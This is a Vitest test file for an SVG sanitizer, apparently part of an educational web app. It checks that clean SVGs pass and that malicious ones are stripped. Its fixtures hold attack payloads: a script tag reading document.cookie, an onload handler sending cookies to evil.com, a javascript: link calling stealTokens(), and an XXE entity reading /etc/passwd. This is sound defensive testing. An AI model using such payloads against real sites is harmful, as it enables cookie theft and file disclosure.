import { describe, it, expect } from 'vitest';
import { sanitizeSvg, isSvgClean } from '@/lib/security/svgSanitizer';

describe('Phase 10 — SVG & Content Security Sanitizer', () => {
  it('identifies and accepts clean, well-formed SVGs', () => {
    const cleanSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="100" height="100">
        <circle cx="50" cy="50" r="40" fill="#0F5B38" />
        <text x="50" y="55" font-size="12" text-anchor="middle" fill="#FFFFFF">NCERT</text>
      </svg>
    `;

    const result = sanitizeSvg(cleanSvg);
    expect(result.isValid).toBe(true);
    expect(result.threatsDetected.length).toBe(0);
    expect(isSvgClean(cleanSvg)).toBe(true);
  });

  it('strips <script> tags embedded inside SVGs', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <circle cx="50" cy="50" r="40" fill="red" />
        <script type="text/javascript">
          alert(document.cookie);
        </script>
      </svg>
    `;

    const result = sanitizeSvg(maliciousSvg);
    expect(result.threatsDetected.some((t) => t.includes('<script>'))).toBe(true);
    expect(result.sanitizedSvg.includes('<script')).toBe(false);
    expect(result.sanitizedSvg.includes('alert(document.cookie)')).toBe(false);
    expect(isSvgClean(maliciousSvg)).toBe(false);
  });

  it('strips inline JavaScript event handlers (onload, onerror, onclick)', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.com?c=' + document.cookie)">
        <image href="x" onerror="alert(1)" />
        <rect width="10" height="10" onclick="evilAction()" />
      </svg>
    `;

    const result = sanitizeSvg(maliciousSvg);
    expect(result.threatsDetected.length).toBeGreaterThan(0);
    expect(result.sanitizedSvg.includes('onload=')).toBe(false);
    expect(result.sanitizedSvg.includes('onerror=')).toBe(false);
    expect(result.sanitizedSvg.includes('onclick=')).toBe(false);
  });

  it('strips javascript: and data: URIs in href and xlink:href', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <a href="javascript:stealTokens()">
          <text>Click for worksheet</text>
        </a>
      </svg>
    `;

    const result = sanitizeSvg(maliciousSvg);
    expect(result.threatsDetected.some((t) => t.includes('Malicious URI scheme'))).toBe(true);
    expect(result.sanitizedSvg.includes('javascript:')).toBe(false);
  });

  it('neutralizes XML External Entity (XXE) vectors in SVG headers', () => {
    const xxeSvg = `
      <?xml version="1.0"?>
      <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <svg xmlns="http://www.w3.org/2000/svg">
        <text>&xxe;</text>
      </svg>
    `;

    const result = sanitizeSvg(xxeSvg);
    expect(result.threatsDetected.some((t) => t.includes('XXE'))).toBe(true);
    expect(result.sanitizedSvg.includes('<!entity')).toBe(false);
  });
});
